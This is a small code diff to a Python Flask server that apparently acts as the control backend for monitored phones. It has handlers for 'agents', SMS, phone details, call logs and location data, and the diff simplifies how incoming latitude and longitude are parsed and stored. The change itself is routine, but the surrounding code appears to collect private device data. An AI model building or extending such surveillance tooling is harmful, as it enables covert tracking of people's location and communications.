@@ -18,7 +18,7 @@ db_file = "database.db"
 @app.route("/")
 def index():
     sql = "SELECT id FROM agents"
-    agents = get_data_sql(sql)
+    agents, columns = get_data_sql(sql)
     return render_template("index.html", agents=agents)
 
 @app.route("/sms")
@@ -290,14 +290,14 @@ def handle_phonedetails(content, id):
 def handle_location(content, id):
     print(f"Received location data: {content}\n\n")
     clearAgentTasks(id)
-    for json_data in content:
-        latitude = json_data.get("latitude", "")
-        longitude = json_data.get("longitude", "")
 
-        # Save data to database
-        sql = "INSERT INTO location VALUES (?, ?, ?)"
-        args = (id, latitude, longitude)
-        writeToDatabase(sql, args)
+    latitude = content.get("latitude", "")
+    longitude = content.get("longitude", "")
+
+    # Save data to database
+    sql = "INSERT INTO location VALUES (?, ?, ?)"
+    args = (id, latitude, longitude)
+    writeToDatabase(sql, args)
 
 
 def handle_calllog(content, id):
